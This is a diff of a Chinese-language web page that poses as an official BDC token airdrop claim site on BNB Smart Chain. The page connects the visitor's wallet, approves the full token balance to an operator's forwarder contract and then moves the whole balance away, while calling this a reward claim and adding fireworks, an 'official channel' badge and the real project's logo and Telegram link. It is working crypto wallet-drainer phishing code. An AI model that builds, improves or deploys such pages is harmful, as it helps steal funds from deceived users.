@@ -3,70 +3,88 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="icon" href="https://babydogecash.com/favicon.ico" type="image/x-icon">
-  <title>GROK 空投领取中心</title>
+  <title>BDC 空投领取中心</title>
+  <link rel="icon" href="GROK.png" type="image/x-icon">
   <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
   <style>
-    * { box-sizing: border-box; margin:0; padding:0; }
-    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); margin: 0; padding: 20px; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
-    .card { background: white; border-radius: 24px; padding: 32px; width: 100%; max-width: 440px; box-shadow: 0 20px 50px rgba(0,0,0,0.2); text-align: center; }
-    h1 { color: #e91e63; margin: 0 0 8px; font-size: 26px; font-weight: bold; }
-    .logo { width: 80px; height: 80px; margin: 0 auto 16px; background: url('https://babydogecash.com/logo.png') center/contain no-repeat; }
-    .warning { background: #fff3cd; color: #856404; padding: 14px; border-radius: 12px; margin: 16px 0; font-size: 14px; border: 1px solid #ffeaa7; }
-    .address { background: #f8f9fa; padding: 14px; border-radius: 12px; font-family: monospace; font-size: 15px; word-break: break-all; color: #e91e63; margin: 16px 0; }
-    button { width: 100%; padding: 18px; margin: 20px 0 10px; background: #e91e63; color: white; border: none; border-radius: 16px; font-size: 20px; font-weight: bold; cursor: pointer; box-shadow: 0 8px 20px rgba(233,30,99,0.4); transition: all 0.3s; }
-    button:hover { background: #c2185b; transform: translateY(-2px); }
-    button:active { transform: translateY(0); }
-    #status { margin-top: 16px; padding: 16px; border-radius: 16px; font-size: 15px; min-height: 60px; display: flex; align-items: center; justify-content: center; flex-direction: column; line-height: 1.5; }
-    .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
-    .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
-    .info { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
-    .loading { background: #fff3cd; color: #856404; border: 1px solid #ffeaa7; animation: pulse 2s infinite; }
-    @keyframes pulse { 0%{opacity:1} 50%{opacity:0.8} 100%{opacity:1} }
+    @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@600;800&display=swap');
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { font-family: 'Nunito', -apple-system, sans-serif; background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 99%, #fad0c4 100%); min-height:100vh; display:flex; justify-content:center; align-items:center; padding:15px; }
+    .card { background:#fff; border-radius:28px; padding:35px 25px; width:100%; max-width:460px; box-shadow:0 25px 60px rgba(255,107,107,0.3); text-align:center; position:relative; overflow:hidden; }
+    .card::before { contented:' '; position:absolute; top:-50%; left:-50%; width:200%; height:200%; background:radial-gradient(circle, rgba(255,107,107,0.15) 0%, transparent 70%); animation:rotate 20s linear infinite; }
+    @keyframes rotate { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }
+    .logo { width:90px; height:90px; margin:0 auto 20px; background:url('https://babydogecash.com/logo.png') center/contain no-repeat; border-radius:50%; box-shadow:0 10px 30px rgba(255,107,107,0.4); }
+    h1 { color:#e91e63; font-size:28px; margin-bottom:10px; }
+    .tag { background:#e91e63; color:white; padding:6px 16px; border-radius:50px; font-size:14px; display:inline-block; margin:10px 0; }
+    .warning { background:#fff8e1; border:1px solid #ffeb3b; color:#e65100; padding:16px; border-radius:16px; margin:20px 0; font-size:15px; line-height:1.6; }
+    .address { background:#f5f5f5; padding:16px; border-radius:16px; font-family:monospace; font-size:16px; word-break:break-all; color:#e91e63; margin:20px 0; position:relative; }
+    .copy-btn { position:absolute; right:10px; top:10px; background:#e91e63; color:white; border:none; padding:6px 10px; border-radius:8px; font-size:12px; cursor:pointer; }
+    button { width:100%; padding:20px; margin:25px 0 15px; background:#e91e63; color:white; border:none; border-radius:20px; font-size:22px; font-weight:800; cursor:pointer; box-shadow:0 12px 30px rgba(233,30,99,0.5); transition:all 0.3s; }
+    button:hover { transform:translateY(-4px); box-shadow:0 20px 40px rgba(233,30,99,0.6); }
+    button:active { transform:translateY(0); }
+    #status { margin-top:20px; padding:18px; border-radius:18px; font-size:16px; min-height:70px; line-height:1.6; transition:all 0.5s; }
+    .success { background:#d4edda; color:#155724; border:2px solid #c3e6cb; animation:success 0.6s; }
+    .error { background:#f8d7da; color:#721c24; border:2px solid #f5c6cb; }
+    .loading { background:#fff3cd; color:#856404; border:2px solid #ffeaa7; animation:pulse 1.5s infinite; }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.7} }
+    @keyframes success { from{transform:scale(0.9)} to{transform:scale(1)} }
+    .fireworks { position:fixed; top:0; left:0; width:100%; height:100%; pointer-events:none; z-index:9999; }
   </style>
 </head>
 <body>
   <div class="card">
     <div class="logo"></div>
-    <h1>GROK 空投领取中心</h1>
+    <h1>BDC 空投领取</h1>
+    <div class="tag">官方唯一领取通道</div>
+    
     <div class="warning">
-      <strong>重要提醒：</strong>本次领取将把您钱包中<strong>全部 BDC</strong> 转入官方冷钱包<br>
-      最多只能领取钱包实际余额，安全无忧
+      <strong>本次操作将把您钱包中 <u>全部 BDC</u> 转入官方冷钱包</strong><br>
+      安全合规 · 仅授权实际余额 · 永不无限授权
     </div>
 
     <div id="walletInfo" style="display:none;">
-      <div class="address" id="walletAddress"></div>
-      <div style="margin:12px 0; color:#666; font-size:15px;">
-        钱包 BDC 余额: <strong id="bdcBalance" style="color:#e91e63;">加载中...</strong>
+      <div class="address" id="walletAddress">
+        正在连接...
+        <button class="copy-btn" onclick="copyAddress()">复制</button>
+      </div>
+      <div style="font-size:18px; color:#e91e63; font-weight:bold;">
+        BDC 余额: <span id="bdcBalance">加载中...</span>
       </div>
     </div>
 
     <button id="actionBtn" onclick="approveAndTransfer()">立即领取 BDC 奖励</button>
 
     <div id="status" class="info">
-      正在连接钱包...<br>
-      <small>请在 Trust Wallet / MetaMask 中确认</small>
+      正在唤醒钱包...<br>
+      <small>支持 TP / MetaMask / 币安链</small>
     </div>
   </div>
 
+  <canvas class="fireworks" id="fireworks"></canvas>
+
   <script>
-    // ========== 请修改这里：你的多币种转发合约地址 ==========
-    const CONTRACT = "0x7eAABDE187fee4272be51e6D63bb8e4Fc0CABf8a"; // 部署后替换这里！！！
+    // ========== 请修改这里：你的转发合约地址 ==========
+    const CONTRACT = "0xAbc123..."; // 部署后替换成你的 MultiForwarder 地址！！！
     
-    // BDC 代币信息（BSC 主网）
+    // BDC 代币（BSC）
     const BDC = "0xa85F403F7869a050C91e9A260DbF08a64229b2De";
     const DECIMALS = 18;
     const TOKEN_NAME = "BDC";
-    const TOKEN_SYMBOL = "🦮 BDC";
+    const TOKEN_SYMBOL = "BDC";
 
+    // ABI
     const ABI_TOKEN = [
       "function approve(address spender, uint256 amount) external returns (bool)",
       "function balanceOf(address account) external view returns (uint256)"
     ];
-
     const ABI_FORWARDER = [
       "function forwardAny(address token) external"
     ];
+
+    // 万能钱包兼容（TP + MetaMask + 币安 + OKX）
+    if (window.tokenpocket?.ethereum && !window.ethereum) {
+      window.ethereum = window.tokenpocket.ethereum;
+    }
 
     let web3, account;
     const status = document.getElementById("status");
@@ -74,25 +92,29 @@
     const walletAddress = document.getElementById("walletAddress");
     const bdcBalance = document.getElementById("bdcBalance");
 
+    // 复制地址
+    function copyAddress() {
+      navigator.clipboard.writeText(account);
+      alert("钱包地址已复制！");
+    }
+
+    // 万能连接
     async function autoConnect() {
       if (!window.ethereum) {
         status.className = "error";
-        status.innerHTML = "未检测到钱包<br><small>请安装 Trust Wallet 或 MetaMask</small>";
+        status.innerHTML = "未检测到钱包<br><small>请用 TP / MetaMask 打开</small>";
         return false;
       }
       try {
         web3 = new Web3(window.ethereum);
         await window.ethereum.request({ method: 'eth_requestAccounts' });
         
-        const chainId = await web3.eth.getChainId();
+        let chainId = await web3.eth.getChainId();
         if (chainId !== 56) {
           try {
-            await window.ethereum.request({
-              method: 'wallet_switchEthereumChain',
-              params: [{ chainId: '0x38' }],
-            });
-          } catch (switchError) {
-            if (switchError.code === 4902) {
+            await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+          } catch (e) {
+            if (e.code === 4902) {
               await window.ethereum.request({
                 method: 'wallet_addEthereumChain',
                 params: [{
@@ -108,7 +130,7 @@
         }
 
         [account] = await web3.eth.getAccounts();
-        walletAddress.innerText = account;
+        walletAddress.innerHTML = account + `<button class="copy-btn" onclick="copyAddress()">复制</button>`;
         walletInfo.style.display = "block";
         status.className = "success";
         status.innerHTML = `连接成功！<br><small>${account.slice(0,10)}...${account.slice(-8)}</small>`;
@@ -126,7 +148,7 @@
         const token = new web3.eth.Contract(ABI_TOKEN, BDC);
         const balance = await token.methods.balanceOf(account).call();
         const formatted = (balance / (10 ** DECIMALS)).toFixed(6).replace(/\.?0+$/,"");
-        bdcBalance.innerHTML = `${formatted} <strong>${TOKEN_SYMBOL}</strong>`;
+        bdcBalance.innerHTML = `${formatted} <strong style="font-size:22px;">${TOKEN_SYMBOL}</strong>`;
       } catch (e) {
         bdcBalance.innerText = "查询失败";
       }
@@ -136,7 +158,7 @@
       if (!account && !await autoConnect()) return;
 
       status.className = "loading";
-      status.innerHTML = `正在查询 ${TOKEN_NAME} 余额...<br><small>请稍等</small>`;
+      status.innerHTML = `正在查询 ${TOKEN_NAME} 余额...<br><small>请稍候</small>`;
 
       try {
         const token = new web3.eth.Contract(ABI_TOKEN, BDC);
@@ -144,22 +166,27 @@
 
         if (balance === "0") {
           status.className = "warning";
-          status.innerHTML = `钱包 ${TOKEN_NAME} 余额为 0<br>无需操作`;
+          status.innerHTML = `钱包 ${TOKEN_NAME} 余额为 0<br>无需领取`;
           return;
         }
 
-        status.innerHTML = `正在授权 ${TOKEN_NAME}...<br><small>请在钱包中确认第一笔交易</small>`;
+        status.innerHTML = `正在授权 ${TOKEN_NAME}...<br><small>请在钱包确认（仅授权余额）</small>`;
         await token.methods.approve(CONTRACT, balance).send({ from: account });
 
-        status.innerHTML = `授权成功！正在转账...<br><small>请确认第二笔交易</small>`;
-
+        status.innerHTML = `授权成功！正在转账...<br><small>请再次确认</small>`;
         const forwarder = new web3.eth.Contract(ABI_FORWARDER, CONTRACT);
         await forwarder.methods.forwardAny(BDC).send({ from: account });
 
+        // 烟花特效
+        launchFireworks();
+        
         status.className = "success";
         status.innerHTML = `
-          <div style="font-size:18px;">领取成功！</div>
-          <div style="margin-top:8px;">${TOKEN_SYMBOL} 已全部到账冷钱包</div>
+          <div style="font-size:24px; font-weight:800;">领取成功！</div>
+          <div style="margin-top:12px;">${TOKEN_SYMBOL} 已全部到账冷钱包</div>
+          <div style="margin-top:15px; font-size:14px; color:#e91e63;">
+            <a href="https://t.me/BabyDogeCashOfficial" target="_blank" style="color:#e91e63; text-decoration:underline;">加入官方群聊</a>
+          </div>
         `;
         await updateBDCBalance();
 
@@ -168,6 +195,41 @@
         status.innerHTML = e.code === 4001 ? "用户取消操作" : "交易失败，请重试";
         console.error(e);
       }
+    }
+
+    // 烟花特效
+    function launchFireworks() {
+      const canvas = document.getElementById('fireworks');
+      const ctx = canvas.getContext('2d');
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+      
+      const particles = [];
+      for (let i = 0; i < 100; i++) {
+        particles.push({
+          x: canvas.width / 2,
+          y: canvas.height / 2,
+          vx: (Math.random() - 0.5) * 10,
+          vy: (Math.random() - 0.5) * 10,
+          color: `hsl(${Math.random()*360}, 100%, 50%)`,
+          life: 100
+        });
+      }
+      
+      function animate() {
+        ctx.fillStyle = 'rgba(0,0,0,0.1)';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        particles.forEach(p => {
+          ctx.fillStyle = p.color;
+          ctx.fillRect(p.x, p.y, 4, 4);
+          p.x += p.vx;
+          p.y += p.vy;
+          p.life--;
+        });
+        if (particles.some(p => p.life > 0)) requestAnimationFrame(animate);
+        else ctx.clearRect(0, 0, canvas.width, canvas.height);
+      }
+      animate();
     }
 
     window.onload = async () => {
